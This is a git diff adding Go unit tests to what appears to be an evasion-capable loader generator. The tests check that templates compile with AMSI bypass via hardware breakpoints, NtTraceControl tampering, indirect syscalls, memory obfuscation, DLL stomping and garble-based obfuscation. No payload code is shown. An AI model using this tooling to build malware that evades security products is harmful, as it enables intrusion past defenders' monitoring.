@@ -101,6 +101,8 @@ func baseTestData() TemplateData {
 		EnvBindFeatures:       nil,
 		EnvBindHash:           "",
 		EnableMemObf:          false,
+		JunkFuncs:             nil,
+		JunkCalls:             nil,
 	}
 }
 
@@ -376,4 +378,80 @@ func TestTemplateCompiles_WithMemObfAndIndirectSyscall(t *testing.T) {
 	data.EnableMemObf = true
 	data.EnableIndirectSyscall = true
 	compileTemplate(t, data)
+}
+
+// TestTemplateCompiles_WithT006T007 验证 T006 (HW BP AMSI) + T007 (NtTraceControl) 编译通过
+func TestTemplateCompiles_WithT006T007(t *testing.T) {
+	data := baseTestData()
+
+	techIDs := []string{"T006", "T007"}
+	techs, invalid := knowledge.ByIDs(techIDs)
+	if len(invalid) > 0 {
+		t.Fatalf("unknown technique IDs: %v", invalid)
+	}
+
+	var extraAPIs []string
+	for _, tech := range techs {
+		extraAPIs = append(extraAPIs, tech.APIs...)
+	}
+	data.EncodedStrings = buildEncodedStrings(data.StringKey, extraAPIs)
+
+	for _, tech := range techs {
+		data.EvasionSnippets = append(data.EvasionSnippets, EvasionSnippet{
+			FuncName: "evasion" + tech.ID,
+			Code:     resolveSnippetStrings(tech.CodeSnippet, data.EncodedStrings),
+		})
+	}
+
+	compileTemplate(t, data)
+}
+
+// TestTemplateCompiles_AllEvasionWithIndirectSyscall 验证全部 T001-T007 + Indirect Syscall + MemObf 组合编译通过
+func TestTemplateCompiles_AllEvasionWithIndirectSyscall(t *testing.T) {
+	data := baseTestData()
+	data.EnableIndirectSyscall = true
+	data.EnableMemObf = true
+	data.StompDLL = "winhttp.dll"
+
+	allIDs := []string{"T001", "T002", "T003", "T004", "T005", "T006", "T007"}
+	techs, invalid := knowledge.ByIDs(allIDs)
+	if len(invalid) > 0 {
+		t.Fatalf("unknown technique IDs: %v", invalid)
+	}
+
+	var extraAPIs []string
+	for _, tech := range techs {
+		extraAPIs = append(extraAPIs, tech.APIs...)
+	}
+	data.EncodedStrings = buildEncodedStrings(data.StringKey, extraAPIs)
+
+	for _, tech := range techs {
+		data.EvasionSnippets = append(data.EvasionSnippets, EvasionSnippet{
+			FuncName: "evasion" + tech.ID,
+			Code:     resolveSnippetStrings(tech.CodeSnippet, data.EncodedStrings),
+		})
+	}
+
+	compileTemplate(t, data)
+}
+
+// TestGarbleSeedDerivationDeterministic 验证 garble seed 从 GOPHANTOM_SALT 派生是确定性的
+func TestGarbleSeedDerivationDeterministic(t *testing.T) {
+	salt := "test-salt-value"
+
+	seed1 := deriveGarbleSeed(salt)
+	seed2 := deriveGarbleSeed(salt)
+	if seed1 != seed2 {
+		t.Fatalf("same salt produced different seeds: %q vs %q", seed1, seed2)
+	}
+
+	seed3 := deriveGarbleSeed("different-salt")
+	if seed1 == seed3 {
+		t.Fatal("different salts produced the same seed")
+	}
+
+	// 验证输出长度合理（base64url of 16 bytes = 22 chars without padding）
+	if len(seed1) == 0 || len(seed1) > 24 {
+		t.Fatalf("seed length %d is unexpected", len(seed1))
+	}
 }
